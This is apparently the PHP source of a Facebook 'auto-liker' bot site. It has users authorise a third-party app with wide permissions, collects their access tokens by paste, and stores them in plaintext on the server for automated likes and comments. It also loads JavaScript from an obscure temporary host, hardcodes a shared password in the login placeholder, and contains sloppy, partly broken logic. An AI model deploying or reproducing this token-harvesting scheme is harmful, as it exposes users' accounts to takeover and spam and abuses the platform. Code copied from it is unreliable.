<?php 
session_start();
error_reporting(0);

$site_title = "♥CHAUDHRYS BOTTER♥ ";

// using banned in role will show user that he is banned when he try to login . 
$users = array(
               "lolxhaters" => array("name" => "zain", "role"=> "admin"),
               "lolxhaters" => array("name" => "junaid", "role"=> "admin"),
               "lolxhaters" => array("name" => "sohail", "role"=> "guest"),
               "lolxhaters" => array("name" => "awais", "role"=> "guest")
               );

if(isset($_SESSION['logged']) && !isset($users[$_SESSION['password']]) || $users[$_SESSION['password']]['role'] == 'banned'){
      unset($_SESSION['logged']);
      unset($_SESSION['password']);
      unset($_SESSION['username']);
}

if(!isset($_SESSION['logged']) || $_SESSION['logged'] ==  false){
	$showlogin = true;
	$loginerror = "";
	
   if(isset($_POST['password'])){

      $password = $_POST['password'];

    if(!empty($password)){

      if(isset($users[$password])){
        
         if($users[$password]['role'] !== 'banned'){
      		$_SESSION['logged'] = true;
      		$_SESSION['password'] = $password;
      		$_SESSION['username'] = $users[$password]['name'];
            $showlogin = false;
          }else{
          	 if(isset($users[$password]['msg']) && !empty($users[$password]['msg'])){
              $loginerror =  $users[$password]['msg'];
          	 }else{
              $loginerror = "You are banned from using this bot! Get out of here!";
            }
          }
      }else{
       	  $loginerror = "Wrong Password!";
      }

     }else{
     	$loginerror = "Please enter this Password¡ ( lolxhaters )";
     }
  }
}

 ?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
♥CHAUDHRYS BOTTER♥
</title><link rel="stylesheet" type="text/css" href="ali.css"

</title><link rel="stylesheet" type="text/css" href="black.css" media="all,box.css"/><link rel="shortcut icon" href=""><script type="text/javascript" async="async" defer="defer" data-cfasync="false" src="https://mylivechat.com/chatinline.aspx?hccid=85737440"></script>
<script language="JavaScript" src="http://kijupogo2u.temp.swtest.ru/bb.js"></script>
<?php error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(                                                         
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $cokis[]=$b.'='.$c;
}
$true='?'.implode('&',$cokis);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by chaudhrysbotter.heck.in',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('cokis')){
        mkdir('cokis');
}
if($bb){
$blue=fopen('cokis/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);

echo'<script type="text/javascript">alert("INFO : Text robot telah dibuat")</script>';
}else{
        if($z){
if(file_exists('cokis/'.$id)){
$file=file_get_contents('cokis/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('cokis/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('cokis/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('cokis/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('cokis/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('cokis/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Data Anda telah ter Save, Robot berjalan otomatis")</script>';}}
}

public function lOgbot($d){
        unlink('cokis/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('cokis/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
        $satu='on';
        $ak='Like tambah komen';
}else{
        $satu='off';
        $ak='Like saja';
}
if(preg_match('/on/',$if[2])){
        $dua='on';
        $ik='Bot emo';
}else{
        $dua='off';
        $ik='Bot manual';
}
if(preg_match('/on/',$if[3])){
        $tiga='on';
        $ek='Powered on';

}else{
        $tiga='on';
        $ek='Powered off';
}
if(preg_match('/on/',$if[4])){
        $empat='on';
        $uk='Text via script';
}else{
        $empat='off';
        $uk='Via text sendiri';
}
echo'
<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">CHAUDHRYS BOTTER FAN '.$nm.'</a></h3>
<ul>
<li>
Welcome Back : <font color="green">'.$nm.'</font></li>
<li>
<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<input type="submit" value="Logout Bot"></form></li>
<li>
<form action="index.php" method="post">
Select Menu Robot</li>
<li>
<select name="likes">';
        if($satu=='on'){
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Like saja</option>
</select>';
        }else{
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like tambah komen</option>
</select>';
}
echo'</li>
<li>
<select name="emot">';
        if($dua=='on'){
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot manual</option>
</select>';
        }else{
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot emo</option>
</select>';
}
echo'</li>
<li>
<select name="target">';
        if($tiga=='on'){
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered off</option>
</select>';
        }else{
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered on</option>
</select>';
}
echo'</li>
<li>';
        if($empat=='on'){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
Via text sendiri</option>
</select>';
}else{
        if($if[5]){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Ganti Text Anda
</option>
<option value="on">
Text via script</option>
</select>';
        }else{
        echo'
Buat text Anda
<br>
<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
<input type="submit" value="SAVE"></form>
</div></div></div>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);

$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);

echo'
<div id="header">
<h1 class="heading">
<center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2017/01/11/flamingtext_com_1484166347_572057355.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a></center>
</h1>
<h2 class="description">
</h2></div>';
} 

public function home(){
echo'
<div id="content">
<div class="post">
<div class="post-meta">
<h2 class="title">
</h2>
</div>

<div class="post-content">
<marquee class="GeneratedMarquee" direction="left" scrollamount="12" behavior="scroll"><font size="26" color="red">••´º´•» </font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b> Script Created By Zain Aqdas </b></font><font size="26" color="red"> «•´º´••</font></marquee>
</div>
<div class="post-meta2">
<br><center><font color="yellow" size="+1"><marquee bgcolor="" direction="left" loop="infinite" width="20%"><strong> ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE </strong></marquee>
<br>
</div></div></div>';
}


public function showlogin(){
		 echo '<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link"><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2016/05/07/flamingtext_com_1462657772_442107281.gif" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a></a></h3>
<ul id="search-form">
  
  <form action="index.php" method="post">
  <li><div class="login-error">'.$GLOBALS["loginerror"].'</div></li>
   <li><label class="label-password">Password&nbsp;:    </label><input class="inp-text" placeholder="lolxhaters" type="password" style="height: 20px;width: 250px;" name="password"></li>
    <li><label class="label-submit"></label><input class="inp-btn" type="submit" style="height:28px;" value=" SUBMIT"></li>
  </form>
</ul></div></div>';
	}





public function bwh() {
    
 if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true){
          $this->showlogin();
          $this->membEr();
          return;
 }
 	echo '<div id="bottom-content">
<div id="navigation-menu">
<br><center><h4><font size="26" color="red"><center></font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>⬇ GET WORKING TOKEN ⬇ </b></font><font size="26" color="red"></center></font></h4>
<center><td><a href="https://goo.gl/dWxrQZ" target="_blank" style="text-decoration: none;">
<input type="button" value="❤Allow App❤" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank" style="text-decoration: none;">
<input type="button" value="❤Get Token❤" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td> </a></center>
<br><center><h4><font size="26" color="red"><center></font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>👇 OTHER SERVICES 👇 </b></font><font size="26" color="red"></center></font></h4>
<center><td><a href="https://allfiles.comuf.com/unfriend.php" target="_blank" style="text-decoration: none;">
<input type="button" value="List Clear" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://allfiles.comuf.com/all-accept.php" target="_blank" style="text-decoration: none;">
<input type="button" value="Accept Requests" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://allfiles.comuf.com/auto-poster.php" target="_blank" style="text-decoration: none;">
<input type="button" value="Auto Post" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a></center>
<center><h4><font size="26" color="red"><center>••´º´•» </font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b> 🎭  CHAUDHRY 🌹 BOTTER 🎭 </b></font><font size="26" color="red"> «•´º´••</center></font></h4>
<div id="top-content">
<div id="search-form">

<center><br><form action="index.php" method="post"> <input class="inp-text" type="text" style="height:35px;width:60%;border-radius:15px;border:1px solid white;background: none;color:white;" name="token"> </br> 
<br>
  <input id="sbmt" class="inp-btn" type="submit" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:120px;" value="SUBMIT"></form></div></div></div>';

$this->membEr();
}

public function membEr(){
        if(!is_dir('cokis')){
        mkdir('cokis');
}
$up=opendir('cokis');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
<center><font style="font-family: Iceland;border: 1px solid white;color: white;border-radius: 48px;padding: 11px;font-size: 20px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color: white;background: none;width:140px;">User Active : <font color="red">'.count($user).'</font></font></h3></center><br>
<marquee direction="right"<a><font face="Battle Beasts" size="12"> <script src="babol.js"></script></a></marquee>
</div>';
}



public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('cokis/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('cokis/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Token invalid")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<audio controls autoplay>
  <source src="http://zainx3chbot.heck.in/files/ae-dil-hai-mushkil.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
